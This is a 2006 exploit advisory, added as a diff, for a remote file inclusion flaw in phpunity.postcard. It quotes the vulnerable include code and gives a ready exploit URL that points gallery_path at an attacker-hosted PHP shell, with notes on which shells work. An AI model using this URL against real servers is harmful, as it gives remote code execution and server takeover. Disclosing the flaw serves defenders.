@@ -1,0 +1,59 @@
+######################################################################################
+#                                                                                    #
+#     phpunity.postcard (phpunity-postcard.php) Remote File Inclusion Exploit        #
+#                                                                                    #
+######################################################################################
+#                                                                                    #
+#     Affected Software .: phpunity.postcard                                         #
+#     Vendor ............: http://www.perlunity.de/                                  #
+#     Class .............: Remote File Inclusion                                     #
+#     Risk ..............: high (Remote File Execution)                              #
+#     Found by ..........: Rivertam                                                  #
+#     Contact ...........: rivertam88[at]gmail[.]com                                 #
+#     Discovered on .....: 04.09.2006 (dd.mm.yyyy)                                   #
+#     Published on ......: 13.09.2006 (dd.mm.yyyy)                                   #
+#                                                                                    #
+######################################################################################
+#                                                                                    #
+#     Affected File:                                                                 #
+#          /phpunity-postcard.php                                                    #
+#                                                                                    #
+#     Vulnerable Code:                                                               #
+#          if(isset($plgallery_epost)) {                                             #
+#            $keep_url = "?".$_SERVER['QUERY_STRING'];                               #
+#              if(isset($gallery_path)) {                                            #
+#                include("$gallery_path/admin/inc/config.inc.php");                  #
+#              } else {                                                              #
+#                include("../../phpunity-easygallery/admin/inc/config.inc.php");     #
+#              }                                                                     #
+#          }                                                                         #
+#                                                                                    #
+#     Description:                                                                   #
+#     $gallery_path is not defined before being used and in the config it is         #
+#     standardly out-commentated. To get into the if request we must define          #
+#     $plgallery_epost as 1 (or somethings else)                                     #
+#                                                                                    #
+######################################################################################
+#                                                                                    #
+#     Exploit:                                                                       #
+#     http://[target]/phpunity-postcard.php?plgallery_epost=1&gallery_path=[shell]?  #
+#                                                                                    #
+######################################################################################
+#                                                                                    #
+#     Notice:                                                                        #
+#     Works not with the c99-php shell cause if you use it the plgallery_epost=1     #
+#     getting lost when you change dir or make another action and then the shell     #
+#     unloads.                                                                       #
+#                                                                                    #
+######################################################################################
+#                                                                                    #
+#     Greets: Rivertam [National Cracker Crew]                                       #
+#                                                                                    #
+######################################################################################
+#                                                                                    #
+#     Greets to:                                                                     #
+#     Silver, DOOMER85, Betta splendens and Dye                                      #
+#                                                                                    #
+######################################################################################
+
+# milw0rm.com [2006-09-13]
